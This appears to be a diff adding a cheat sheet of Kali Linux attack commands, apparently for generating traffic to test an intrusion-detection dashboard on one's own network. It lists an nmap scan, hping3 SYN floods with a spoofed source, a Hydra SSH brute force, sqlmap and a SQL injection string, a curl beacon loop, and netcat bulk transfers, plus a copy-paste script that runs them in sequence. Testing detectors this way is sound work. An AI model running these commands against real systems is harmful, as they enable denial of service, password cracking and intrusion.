@@ -1,0 +1,77 @@
+========================================
+KALI LINUX ATTACK COMMANDS
+========================================
+Replace <TARGET_IP> with your router's IP (usually 192.168.0.1 or 192.168.1.1)
+To find target: ip route | grep default
+
+========================================
+1. PORT SCAN (Nmap)
+========================================
+nmap -sS -p 1-600 <TARGET_IP>
+
+========================================
+2. DoS ATTACK (hping3)
+========================================
+sudo hping3 -S --flood -p 80 <TARGET_IP>
+(Press Ctrl+C to stop after 5-10 seconds)
+
+========================================
+3. DDoS ATTACK (hping3 with spoofing)
+========================================
+sudo hping3 -S --flood -a 10.9.9.1 -p 80 <TARGET_IP>
+(Press Ctrl+C to stop after 5-10 seconds)
+
+========================================
+4. BRUTE FORCE SSH (Hydra)
+========================================
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
+(Or use a smaller wordlist: /usr/share/wordlists/rockyou.txt)
+
+========================================
+5. WEB ATTACK (SQLMap)
+========================================
+sqlmap -u "http://<TARGET_IP>/test.php?id=1" --batch
+(Replace with actual vulnerable URL if available)
+
+========================================
+6. BOT BEACON (Curl loop)
+========================================
+while true; do curl -k https://<TARGET_IP>:443; sleep 2; done
+(Press Ctrl+C to stop after 30 seconds)
+
+========================================
+7. INFILTRATION (Large data transfer)
+========================================
+dd if=/dev/zero bs=1M count=100 | nc <TARGET_IP> 443
+(Or use: dd if=/dev/urandom bs=1M count=50 | nc <TARGET_IP> 443)
+
+========================================
+IMPORTANT NOTES:
+========================================
+- Run each command separately and wait for detection
+- Monitor the dashboard at http://127.0.0.1:5000 on Windows
+- All attacks should be performed on YOUR OWN network only
+- Kali VM must be in BRIDGED mode (not NAT)
+- You may need sudo for hping3 and other tools
+- Install missing tools: sudo apt install nmap hping3 hydra sqlmap netcat
+
+========================================
+QUICK TEST (All attacks in sequence):
+========================================
+Copy and paste this into Kali terminal:
+
+echo "Starting Port Scan..."; nmap -sS -p 1-600 <TARGET_IP> > /dev/null 2>&1 &
+sleep 5
+echo "Starting DoS..."; sudo hping3 -S --flood -p 80 <TARGET_IP> &
+sleep 5; sudo killall hping3
+echo "Starting DDoS..."; sudo hping3 -S --flood -a 10.9.9.1 -p 80 <TARGET_IP> &
+sleep 5; sudo killall hping3
+echo "Starting Brute Force..."; for i in {1..40}; do nc -z <TARGET_IP> 22; done &
+sleep 5
+echo "Starting Web Attack..."; for i in {1..20}; do curl "http://<TARGET_IP>/?id=1' OR '1'='1" > /dev/null 2>&1; done &
+sleep 5
+echo "Starting Bot..."; for i in {1..15}; do curl -k https://<TARGET_IP>:443 > /dev/null 2>&1; sleep 2; done &
+echo "Starting Infiltration..."; dd if=/dev/zero bs=1M count=100 2>/dev/null | nc <TARGET_IP> 443
+echo "All attacks completed!"
+
+========================================
